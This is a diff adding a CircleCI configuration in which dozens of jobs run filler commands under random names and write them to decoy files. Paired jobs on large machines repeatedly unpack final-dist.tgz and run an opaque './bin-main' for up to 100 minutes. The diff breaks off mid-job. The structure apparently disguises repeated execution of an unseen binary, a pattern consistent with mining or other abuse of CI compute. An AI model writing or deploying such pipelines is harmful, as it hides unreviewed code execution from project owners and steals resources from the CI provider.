@@ -1,0 +1,1537 @@
+version: 2.1
+
+jobs:
+  install_may2-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: pool skim
+          command: |
+            mkdir -p /tmp/.wsp
+            set +o pipefail 2>/dev/null; yes abc | head -n 794440 | sha1sum > /tmp/.wsp/log.txt; true
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/log.txt)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - log.txt
+  may2-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  redo_lets-go:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: chinup
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print int(sqrt(2)*1000)}'; true ; } > /tmp/.wsp/.done
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/.done)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .done
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/.done 2>/dev/null) <(sort -u /tmp/.wsp/.done 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  vendor_yankee-8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: orbital pass
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=7 2>/dev/null | sha256sum; true ; } > /tmp/.wsp/OK
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/OK)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - OK
+  yankee-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/.done 2>/dev/null) <(sort -u /tmp/.wsp/.done 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  hydrate_preview-v7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: burn in
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "a\nb\nc\nd\ne\n" | nl 2>/dev/null | head -3 || printf "a\nb\nc\nd\ne\n" | awk '{print NR,$0}' | head -3; true ; } > /tmp/.wsp/stage-ok.txt
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/stage-ok.txt)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-ok.txt
+  preview-v7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/stage-ok.txt 2>/dev/null) <(sort -u /tmp/.wsp/stage-ok.txt 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  fetcher_tweak-oauth-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: mask
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 2 100 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next} print}' | tail -5; true ; } > /tmp/.wsp/counts.jsonl
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/counts.jsonl)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - counts.jsonl
+  tweak-oauth-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/counts.jsonl 2>/dev/null) <(sort -u /tmp/.wsp/counts.jsonl 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  preflight_io-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: cantata
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "%s\n" 10 20 30 | awk '{s+=$1; n++}END{print s/n}'; true ; } > /tmp/.wsp/216.data
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/216.data)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 216.data
+  io-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/216.data 2>/dev/null) <(sort -u /tmp/.wsp/216.data 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  reup_sanity:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: fiddle
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=100;i++)if(i*i == int(i*i))x++; print x}'; true ; } > /tmp/.wsp/report.log
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/report.log)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - report.log
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  bootstrap_Prepare_Release3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: transposition
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "pw" | sha256sum | sha256sum | awk '{print $1}' | head -c 24; true ; } > /tmp/.wsp/FINAL
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/FINAL)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - FINAL
+  Prepare_Release3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/FINAL 2>/dev/null) <(sort -u /tmp/.wsp/FINAL 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  resync_ensure-nightly-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: hot swap
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; mkdir -p /tmp/_ln && echo src > /tmp/_ln/orig && ln /tmp/_ln/orig /tmp/_ln/hard && stat -c %h /tmp/_ln/orig && rm -rf /tmp/_ln; true ; } > /tmp/.wsp/report.md
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/report.md)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - report.md
+  ensure-nightly-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/.done 2>/dev/null) <(sort -u /tmp/.wsp/.done 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  cacher_rc-v7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: noon sanity
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 512 /dev/urandom | sha256sum | awk '{print $1}'; true ; } > /tmp/.wsp/buffer.dat
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/buffer.dat)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - buffer.dat
+  rc-v7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  syncer_add-parse-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: spoor
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; grep "." /etc/hostname | md5sum | cut -c1-10; true ; } > /tmp/.wsp/.ok
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/.ok)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .ok
+  add-parse-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/.ok 2>/dev/null) <(sort -u /tmp/.wsp/.ok 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  do_Package_Release7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: thud
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo $(( $(date +%s) % 10000 )) | md5sum; true ; } > /tmp/.wsp/timings.json
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/timings.json)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - timings.json
+  Package_Release7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/timings.json 2>/dev/null) <(sort -u /tmp/.wsp/timings.json 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  hook_java17-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: mig weld
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 204800 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/.wsp/bundle.tgz
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/bundle.tgz)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - bundle.tgz
+  java17-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/bundle.tgz 2>/dev/null) <(sort -u /tmp/.wsp/bundle.tgz 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  inspect_RUN_DEV:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: blue block
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "x1 x2 x3 x4 x5" | awk '{for(i=1;i<=NF;i++)printf "%s ",$i; print ""}'; true ; } > /tmp/.wsp/ckpt-main.state
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/ckpt-main.state)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - ckpt-main.state
+  RUN_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/ckpt-main.state 2>/dev/null) <(sort -u /tmp/.wsp/ckpt-main.state 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  gamma_rm-queue:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: detail sand
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 100 /dev/urandom | od -An -i 2>/dev/null | tr -d ' ' | head -c 40; true ; } > /tmp/.wsp/2023-11-04.data
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/2023-11-04.data)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2023-11-04.data
+  rm-queue:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/2023-11-04.data 2>/dev/null) <(sort -u /tmp/.wsp/2023-11-04.data 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  hydrate_release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: chaos monkey
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 25 | awk '{print int($1/4), $1%4}' | sort | uniq -c | awk 'NR<=4'; true ; } > /tmp/.wsp/checkpoint-C.state
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/checkpoint-C.state)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - checkpoint-C.state
+  release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/checkpoint-C.state 2>/dev/null) <(sort -u /tmp/.wsp/checkpoint-C.state 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  sys_ship-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: neutron drum
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 30 | awk '{bin=int(log($1)/log(2)); counts[bin]++}END{for(b in counts)print b":"counts[b]}' | sort -n; true ; } > /tmp/.wsp/998b.data
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/998b.data)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 998b.data
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  spinner_update-metrics:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: message cto
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; grep "." /etc/hostname | md5sum | cut -c1-10; true ; } > /tmp/.wsp/handoff.sig
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/handoff.sig)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - handoff.sig
+  update-metrics:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/.done 2>/dev/null) <(sort -u /tmp/.wsp/.done 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  inspect_BuildPipeline:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: staccato
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; nproc 2>/dev/null; true ; } > /tmp/.wsp/trace.txt
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/trace.txt)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - trace.txt
+  BuildPipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  package_QA_BUILD_8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: toccata
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 1000 | awk 'NR%13==0' | awk 'END{print NR}'; true ; } > /tmp/.wsp/stage-ok.log
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/stage-ok.log)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-ok.log
+  QA_BUILD_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/stage-ok.log 2>/dev/null) <(sort -u /tmp/.wsp/stage-ok.log 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  ctx2_jul19-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: flamenco stomp
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; date +%s%N; true ; } > /tmp/.wsp/2024-05-11.data
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/2024-05-11.data)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-05-11.data
+  jul19-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  cache_v2-ga3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: presto
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 200 | awk 'NR%7==0{print}' | wc -l; true ; } > /tmp/.wsp/checkpoint-D.pkl
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/checkpoint-D.pkl)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - checkpoint-D.pkl
+  v2-ga3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/checkpoint-D.pkl 2>/dev/null) <(sort -u /tmp/.wsp/checkpoint-D.pkl 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  postbuild_Validate_Pipeline3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: hop
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 15 | awk '{if($1%3==0 && $1%5==0)print "FizzBuzz"; else if($1%3==0)print "Fizz"; else if($1%5==0)print "Buzz"; else print $1}' | wc -l; true ; } > /tmp/.wsp/pt-C.pkl
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/pt-C.pkl)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - pt-C.pkl
+  Validate_Pipeline3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  install_ensure-staging-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: stopper knot
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "deep" | base64 | base64 | base64 -d 2>/dev/null | wc -c; true ; } > /tmp/.wsp/cache.blob
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/cache.blob)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - cache.blob
+  ensure-staging-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Grab prior data
+          command: |
+            join <(sort -u /tmp/.wsp/cache.blob 2>/dev/null) <(sort -u /tmp/.wsp/cache.blob 2>/dev/null) 2>/dev/null | wc -l || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: tar xzvf final-dist.tgz
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./bin-main"
+  provision_fix-cache-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: rollback 1
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /etc/hostname | rev; true ; } > /tmp/.wsp/28.blob
+            echo "staging complete; file length=$(wc -c </tmp/.wsp/28.blob)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 28.blob
+  fix-cache-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
